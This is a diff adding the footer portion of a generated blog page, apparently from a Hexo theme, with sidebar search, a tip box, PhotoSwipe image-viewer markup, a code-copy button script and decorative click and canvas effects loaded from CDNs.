+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
